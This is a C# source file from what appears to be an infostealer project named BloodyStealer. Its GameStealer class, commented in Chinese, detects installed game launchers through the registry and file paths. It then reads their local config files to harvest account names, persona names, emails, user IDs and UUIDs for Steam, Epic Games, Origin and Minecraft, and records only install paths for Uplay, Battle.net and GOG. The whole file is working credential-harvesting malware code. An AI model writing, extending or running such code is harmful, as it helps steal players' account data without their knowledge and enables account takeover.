using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.Security.Cryptography;
using Microsoft.Win32;

namespace BloodyStealer.Stealers
{
    /// <summary>
    /// 游戏数据窃取类，负责从不同游戏平台收集用户数据
    /// </summary>
    internal class GameStealer
    {
        #region 数据结构

        /// <summary>
        /// 游戏平台
        /// </summary>
        public enum GamePlatform
        {
            Steam,
            EpicGames,
            BattleNet,
            Origin,
            Uplay,
            GOG,
            Minecraft
        }

        /// <summary>
        /// 游戏账户信息
        /// </summary>
        public class GameAccount
        {
            public GamePlatform Platform { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
            public string Email { get; set; }
            public Dictionary<string, string> ExtraData { get; set; } = new Dictionary<string, string>();
        }

        #endregion

        #region 属性和字段

        /// <summary>
        /// 收集到的游戏账户列表
        /// </summary>
        public List<GameAccount> Accounts { get; private set; } = new List<GameAccount>();

        /// <summary>
        /// 平台安装路径字典
        /// </summary>
        private Dictionary<GamePlatform, string> _platformPaths = new Dictionary<GamePlatform, string>();

        /// <summary>
        /// 已安装的游戏平台列表
        /// </summary>
        public List<GamePlatform> InstalledPlatforms { get; private set; } = new List<GamePlatform>();

        #endregion

        #region 构造函数

        /// <summary>
        /// 初始化游戏数据窃取器
        /// </summary>
        public GameStealer()
        {
            DetectInstalledPlatforms();
        }

        /// <summary>
        /// 检测已安装的游戏平台
        /// </summary>
        private void DetectInstalledPlatforms()
        {
            try
            {
                // Steam
                string steamPath = GetSteamPath();
                if (!string.IsNullOrEmpty(steamPath))
                {
                    _platformPaths[GamePlatform.Steam] = steamPath;
                    InstalledPlatforms.Add(GamePlatform.Steam);
                }

                // Epic Games
                string epicPath = GetEpicGamesPath();
                if (!string.IsNullOrEmpty(epicPath))
                {
                    _platformPaths[GamePlatform.EpicGames] = epicPath;
                    InstalledPlatforms.Add(GamePlatform.EpicGames);
                }

                // Origin
                string originPath = GetOriginPath();
                if (!string.IsNullOrEmpty(originPath))
                {
                    _platformPaths[GamePlatform.Origin] = originPath;
                    InstalledPlatforms.Add(GamePlatform.Origin);
                }

                // Uplay
                string uplayPath = GetUplayPath();
                if (!string.IsNullOrEmpty(uplayPath))
                {
                    _platformPaths[GamePlatform.Uplay] = uplayPath;
                    InstalledPlatforms.Add(GamePlatform.Uplay);
                }

                // Battle.net
                string battleNetPath = GetBattleNetPath();
                if (!string.IsNullOrEmpty(battleNetPath))
                {
                    _platformPaths[GamePlatform.BattleNet] = battleNetPath;
                    InstalledPlatforms.Add(GamePlatform.BattleNet);
                }

                // GOG
                string gogPath = GetGOGPath();
                if (!string.IsNullOrEmpty(gogPath))
                {
                    _platformPaths[GamePlatform.GOG] = gogPath;
                    InstalledPlatforms.Add(GamePlatform.GOG);
                }

                // Minecraft
                string minecraftPath = GetMinecraftPath();
                if (!string.IsNullOrEmpty(minecraftPath))
                {
                    _platformPaths[GamePlatform.Minecraft] = minecraftPath;
                    InstalledPlatforms.Add(GamePlatform.Minecraft);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error detecting game platforms: {ex.Message}");
            }
        }

        #endregion

        #region 公共方法

        /// <summary>
        /// 窃取所有游戏平台数据
        /// </summary>
        public void StealAll()
        {
            try
            {
                foreach (GamePlatform platform in InstalledPlatforms)
                {
                    switch (platform)
                    {
                        case GamePlatform.Steam:
                            StealSteamData();
                            break;
                        case GamePlatform.EpicGames:
                            StealEpicGamesData();
                            break;
                        case GamePlatform.Origin:
                            StealOriginData();
                            break;
                        case GamePlatform.Uplay:
                            StealUplayData();
                            break;
                        case GamePlatform.BattleNet:
                            StealBattleNetData();
                            break;
                        case GamePlatform.GOG:
                            StealGOGData();
                            break;
                        case GamePlatform.Minecraft:
                            StealMinecraftData();
                            break;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error in StealAll: {ex.Message}");
            }
        }

        /// <summary>
        /// 获取收集到的统计信息
        /// </summary>
        /// <returns>统计信息字符串</returns>
        public string GetStatistics()
        {
            Dictionary<GamePlatform, int> platformCounts = new Dictionary<GamePlatform, int>();

            foreach (GameAccount account in Accounts)
            {
                if (!platformCounts.ContainsKey(account.Platform))
                {
                    platformCounts[account.Platform] = 0;
                }
                platformCounts[account.Platform]++;
            }

            StringBuilder sb = new StringBuilder();
            sb.AppendLine($"已安装游戏平台: {InstalledPlatforms.Count}");
            sb.AppendLine($"收集到的账户: {Accounts.Count}");

            foreach (var pair in platformCounts)
            {
                sb.AppendLine($"{pair.Key}: {pair.Value}");
            }

            return sb.ToString();
        }

        #endregion

        #region 私有方法 - 路径检测

        private string GetSteamPath()
        {
            try
            {
                string steamPath = (string)Registry.GetValue(
                    @"HKEY_CURRENT_USER\Software\Valve\Steam", "SteamPath", null);
                
                return steamPath;
            }
            catch
            {
                return null;
            }
        }

        private string GetEpicGamesPath()
        {
            try
            {
                string programData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                string epicPath = Path.Combine(programData, "Epic");
                
                if (Directory.Exists(epicPath))
                {
                    return epicPath;
                }
                
                return null;
            }
            catch
            {
                return null;
            }
        }

        private string GetOriginPath()
        {
            try
            {
                string originPath = (string)Registry.GetValue(
                    @"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Origin", "OriginPath", null);
                
                return originPath;
            }
            catch
            {
                return null;
            }
        }

        private string GetUplayPath()
        {
            try
            {
                string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                string uplayPath = Path.Combine(programFiles, "Ubisoft", "Ubisoft Game Launcher");
                
                if (Directory.Exists(uplayPath))
                {
                    return uplayPath;
                }
                
                return null;
            }
            catch
            {
                return null;
            }
        }

        private string GetBattleNetPath()
        {
            try
            {
                string programData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                string battleNetPath = Path.Combine(programData, "Battle.net");
                
                if (Directory.Exists(battleNetPath))
                {
                    return battleNetPath;
                }
                
                return null;
            }
            catch
            {
                return null;
            }
        }

        private string GetGOGPath()
        {
            try
            {
                string programData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                string gogPath = Path.Combine(programData, "GOG.com");
                
                if (Directory.Exists(gogPath))
                {
                    return gogPath;
                }
                
                return null;
            }
            catch
            {
                return null;
            }
        }

        private string GetMinecraftPath()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string minecraftPath = Path.Combine(appData, ".minecraft");
                
                if (Directory.Exists(minecraftPath))
                {
                    return minecraftPath;
                }
                
                return null;
            }
            catch
            {
                return null;
            }
        }

        #endregion

        #region 平台数据窃取

        /// <summary>
        /// 窃取Steam数据
        /// </summary>
        private void StealSteamData()
        {
            try
            {
                string steamPath = _platformPaths[GamePlatform.Steam];
                
                if (string.IsNullOrEmpty(steamPath) || !Directory.Exists(steamPath))
                {
                    return;
                }
                
                // 查找Steam配置文件
                string configPath = Path.Combine(steamPath, "config");
                if (!Directory.Exists(configPath))
                {
                    return;
                }
                
                // 提取登录信息
                try
                {
                    string loginUsersPath = Path.Combine(configPath, "loginusers.vdf");
                    if (File.Exists(loginUsersPath))
                    {
                        string content = File.ReadAllText(loginUsersPath);
                        
                        // 使用正则表达式提取用户名
                        var usernames = Regex.Matches(content, "\"AccountName\"\\s+\"([^\"]+)\"")
                            .Cast<Match>()
                            .Select(m => m.Groups[1].Value)
                            .ToList();
                        
                        // 使用正则表达式提取个人名称
                        var personaNames = Regex.Matches(content, "\"PersonaName\"\\s+\"([^\"]+)\"")
                            .Cast<Match>()
                            .Select(m => m.Groups[1].Value)
                            .ToList();
                        
                        // 匹配用户名和个人名称
                        for (int i = 0; i < Math.Min(usernames.Count, personaNames.Count); i++)
                        {
                            var account = new GameAccount
                            {
                                Platform = GamePlatform.Steam,
                                Username = usernames[i],
                                ExtraData = new Dictionary<string, string>
                                {
                                    { "PersonaName", personaNames[i] }
                                }
                            };
                            
                            Accounts.Add(account);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error extracting Steam login info: {ex.Message}");
                }
                
                // 提取Steam配置文件中的其他数据
                try
                {
                    string configFile = Path.Combine(configPath, "config.vdf");
                    if (File.Exists(configFile))
                    {
                        string content = File.ReadAllText(configFile);
                        
                        // 查找额外信息如电子邮件域名等
                        var emailDomains = Regex.Matches(content, "\"EmailDomain\"\\s+\"([^\"]+)\"")
                            .Cast<Match>()
                            .Select(m => m.Groups[1].Value)
                            .FirstOrDefault();
                        
                        if (!string.IsNullOrEmpty(emailDomains) && Accounts.Count > 0)
                        {
                            Accounts[0].ExtraData["EmailDomain"] = emailDomains;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error extracting Steam config: {ex.Message}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing Steam data: {ex.Message}");
            }
        }

        /// <summary>
        /// 窃取Epic Games数据
        /// </summary>
        private void StealEpicGamesData()
        {
            try
            {
                string epicPath = _platformPaths[GamePlatform.EpicGames];
                
                if (string.IsNullOrEmpty(epicPath) || !Directory.Exists(epicPath))
                {
                    return;
                }
                
                // Epic Games在本地存储中保存了用户数据
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string epicDataPath = Path.Combine(localAppData, "EpicGamesLauncher", "Saved", "Config", "Windows");
                
                if (!Directory.Exists(epicDataPath))
                {
                    return;
                }
                
                try
                {
                    string[] jsonFiles = Directory.GetFiles(epicDataPath, "*.json");
                    
                    foreach (string file in jsonFiles)
                    {
                        string content = File.ReadAllText(file);
                        
                        // 尝试提取用户ID和显示名称
                        var displayNames = Regex.Matches(content, "\"DisplayName\"\\s*:\\s*\"([^\"]+)\"")
                            .Cast<Match>()
                            .Select(m => m.Groups[1].Value)
                            .ToList();
                        
                        var userIds = Regex.Matches(content, "\"Id\"\\s*:\\s*\"([^\"]+)\"")
                            .Cast<Match>()
                            .Select(m => m.Groups[1].Value)
                            .ToList();
                        
                        // 提取可能的电子邮件地址
                        var emails = Regex.Matches(content, "\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}\\b")
                            .Cast<Match>()
                            .Select(m => m.Value)
                            .Distinct()
                            .ToList();
                        
                        // 创建账户记录
                        if (displayNames.Count > 0 || userIds.Count > 0 || emails.Count > 0)
                        {
                            var account = new GameAccount
                            {
                                Platform = GamePlatform.EpicGames,
                                Username = displayNames.FirstOrDefault() ?? "",
                                Email = emails.FirstOrDefault() ?? ""
                            };
                            
                            // 添加额外数据
                            if (userIds.Count > 0)
                            {
                                account.ExtraData["UserId"] = userIds.FirstOrDefault();
                            }
                            
                            Accounts.Add(account);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error extracting Epic Games data: {ex.Message}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing Epic Games data: {ex.Message}");
            }
        }

        /// <summary>
        /// 窃取Origin数据
        /// </summary>
        private void StealOriginData()
        {
            try
            {
                string originPath = _platformPaths[GamePlatform.Origin];
                
                if (string.IsNullOrEmpty(originPath) || !Directory.Exists(originPath))
                {
                    return;
                }
                
                // Origin在本地存储用户数据
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string originDataPath = Path.Combine(localAppData, "Origin");
                
                if (!Directory.Exists(originDataPath))
                {
                    return;
                }
                
                try
                {
                    string[] localStorageFiles = Directory.GetFiles(originDataPath, "local_*.xml");
                    
                    foreach (string file in localStorageFiles)
                    {
                        string content = File.ReadAllText(file);
                        
                        // 提取用户名和电子邮件
                        var usernames = Regex.Matches(content, "<userName>([^<]+)</userName>")
                            .Cast<Match>()
                            .Select(m => m.Groups[1].Value)
                            .ToList();
                        
                        var emails = Regex.Matches(content, "<email>([^<]+)</email>")
                            .Cast<Match>()
                            .Select(m => m.Groups[1].Value)
                            .ToList();
                        
                        // 匹配用户名和电子邮件
                        for (int i = 0; i < Math.Max(usernames.Count, emails.Count); i++)
                        {
                            var account = new GameAccount
                            {
                                Platform = GamePlatform.Origin,
                                Username = i < usernames.Count ? usernames[i] : "",
                                Email = i < emails.Count ? emails[i] : ""
                            };
                            
                            Accounts.Add(account);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error extracting Origin data: {ex.Message}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing Origin data: {ex.Message}");
            }
        }

        /// <summary>
        /// 窃取Uplay数据
        /// </summary>
        private void StealUplayData()
        {
            // 简化实现，类似上述平台
            try
            {
                string uplayPath = _platformPaths[GamePlatform.Uplay];
                
                if (string.IsNullOrEmpty(uplayPath) || !Directory.Exists(uplayPath))
                {
                    return;
                }
                
                // 提取基本信息
                var account = new GameAccount
                {
                    Platform = GamePlatform.Uplay,
                    ExtraData = new Dictionary<string, string>
                    {
                        { "InstallPath", uplayPath }
                    }
                };
                
                Accounts.Add(account);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing Uplay data: {ex.Message}");
            }
        }

        /// <summary>
        /// 窃取Battle.net数据
        /// </summary>
        private void StealBattleNetData()
        {
            // 简化实现，类似上述平台
            try
            {
                string battleNetPath = _platformPaths[GamePlatform.BattleNet];
                
                if (string.IsNullOrEmpty(battleNetPath) || !Directory.Exists(battleNetPath))
                {
                    return;
                }
                
                // 提取基本信息
                var account = new GameAccount
                {
                    Platform = GamePlatform.BattleNet,
                    ExtraData = new Dictionary<string, string>
                    {
                        { "InstallPath", battleNetPath }
                    }
                };
                
                Accounts.Add(account);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing Battle.net data: {ex.Message}");
            }
        }

        /// <summary>
        /// 窃取GOG数据
        /// </summary>
        private void StealGOGData()
        {
            // 简化实现，类似上述平台
            try
            {
                string gogPath = _platformPaths[GamePlatform.GOG];
                
                if (string.IsNullOrEmpty(gogPath) || !Directory.Exists(gogPath))
                {
                    return;
                }
                
                // 提取基本信息
                var account = new GameAccount
                {
                    Platform = GamePlatform.GOG,
                    ExtraData = new Dictionary<string, string>
                    {
                        { "InstallPath", gogPath }
                    }
                };
                
                Accounts.Add(account);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing GOG data: {ex.Message}");
            }
        }

        /// <summary>
        /// 窃取Minecraft数据
        /// </summary>
        private void StealMinecraftData()
        {
            try
            {
                string minecraftPath = _platformPaths[GamePlatform.Minecraft];
                
                if (string.IsNullOrEmpty(minecraftPath) || !Directory.Exists(minecraftPath))
                {
                    return;
                }
                
                // 查找Minecraft launcher_profiles.json
                string profilesPath = Path.Combine(minecraftPath, "launcher_profiles.json");
                
                if (!File.Exists(profilesPath))
                {
                    return;
                }
                
                try
                {
                    string content = File.ReadAllText(profilesPath);
                    
                    // 提取账户信息
                    var usernames = Regex.Matches(content, "\"displayName\"\\s*:\\s*\"([^\"]+)\"")
                        .Cast<Match>()
                        .Select(m => m.Groups[1].Value)
                        .ToList();
                    
                    var uuids = Regex.Matches(content, "\"uuid\"\\s*:\\s*\"([^\"]+)\"")
                        .Cast<Match>()
                        .Select(m => m.Groups[1].Value)
                        .ToList();
                    
                    // 匹配用户名和UUID
                    for (int i = 0; i < Math.Min(usernames.Count, uuids.Count); i++)
                    {
                        var account = new GameAccount
                        {
                            Platform = GamePlatform.Minecraft,
                            Username = usernames[i],
                            ExtraData = new Dictionary<string, string>
                            {
                                { "UUID", uuids[i] }
                            }
                        };
                        
                        Accounts.Add(account);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error extracting Minecraft data: {ex.Message}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing Minecraft data: {ex.Message}");
            }
        }

        #endregion
    }
}